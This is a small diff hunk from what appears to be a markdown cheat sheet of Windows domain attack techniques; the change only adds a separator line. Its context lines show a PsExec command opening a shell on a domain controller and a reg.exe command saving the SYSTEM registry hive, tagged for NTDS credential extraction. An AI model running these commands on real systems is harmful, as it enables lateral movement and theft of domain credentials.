@@ -326,6 +326,7 @@ PsExec.exe \\$DOMAIN_CONTROLLER cmd.exe
 ```
 
 Volume Shadow Copy:
+---
 #vshadow #ntds #system-bak
 ```powershell
 reg.exe save hklm\system c:\system.bak
